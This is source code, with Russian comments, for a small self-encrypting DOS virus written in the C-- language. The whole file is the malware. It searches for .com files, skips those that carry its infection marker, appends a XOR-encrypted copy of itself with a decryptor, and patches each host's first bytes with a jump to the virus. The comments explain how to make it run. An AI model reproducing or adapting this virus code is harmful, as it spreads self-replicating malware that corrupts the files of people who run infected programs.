/* Простой шифрующийся вирус...

Name:	C--Encrypted
Size:	281
Type:	Trivial.Encrypted.Com

Для запуска нужно добавить 4 NOP'a в начало скомпилированного виря

*/

/* Описания флагов компилятора */
?alignword		0		/* нет выравнивания */
?resize			0		/* Нет процедуры изменения блока 
						памяти */ 
?codesize				/* Оптимизация по размеру */
?jumptomain		short
?startaddress		0		/* org 0 */
/* Некоторые include */
?include "dos.h--"

?define	vlen		281
?define	dclen		sizeof(file "decrypt.bin");	/* Во прикол то :) */

byte	old[4] = {0x90,0xCD,0x20,0x90};	/* Первоначальный носитель */
byte	jmpc   = 0xE9;
word	jofs   = 0;
byte	mark   = 0x40;

struct	fileinfo
{
byte	stuff[21];
byte	fattr;
word	ftime;
word	fdate;
dword	fsize;
byte	fname[13];
} dta;

byte	free[vlen+dclen];
byte	decr = FROM "decrypt.bin";	/* Импортируем декриптор...Rulezzz ! */

/*---------------------------------------------------------------*/
main()
{
 $call lbl
lbl:
 $pop  SI
 $sub  SI,#lbl
 
 DI = 0x100;
 $push DI
 $push SI
 SI = SI + #old;
 $movsw;		/* Восстановим носитель */
 $movsw;		/* Естественно можно использовать for но зачем ? */
 $pop  SI

 setDTA(DS,#dta+SI);		/* Установим Dta */
 if (@FINDFIRSTFILE(,,0,#fmask+SI) == 0)
  {
   do
    {
      BX = FOPEN(2,,,#dta.fname+SI);	/* Откроем найденый файл */
      @FREAD(,BX,4,#old+SI);		/* Прочитаем 4 байта */
       if (old[3+SI] != 0x40)		/* Есть метка заражения ? */
         {
          @FSEEK(2,BX,0,0);		/* Прыгаем на конец файла */
          $push AX;			/* Сохраним размер */
	  AX = vlen;
	  decr[8+SI] = AL; decr[9+SI] = AH;
					/* По половинкам запомним наш размер */
	  $in AL,0x40			/* Псевдо-random */
	  decr[0xD+SI] = AL; DH = AL;
	  DI = #free+SI;
	  $push SI
	  $push SI
	   CX = #decr+SI; SI = CX; CX = dclen; 
	   $rep
	   $movsb			/* Переписываем декриптор */
	    CX = vlen;
	  $pop SI
	  loop(CX)			/* Шифруемся */
		{
		 $lodsb
		 $xor AL,DH
		 $stosb
		}
	  $pop  SI
	  FWRITE(,BX,vlen+dclen,#free+SI);
          $pop  AX;
	  jofs[SI] = AX - 3;
          @FSEEK(0,BX,0,0);		/* На начало файла */
          @FWRITE(,BX,4,#jmpc+SI);	/* Пишим Jmp */
         }
       @FCLOSE(,BX);			/* Закрываем файл */
    } while(@FINDNEXTFILE() == 0); 
  }
}					/* компилятор вставит ret */
byte	fmask = "*.com";		/* Собственно маска */
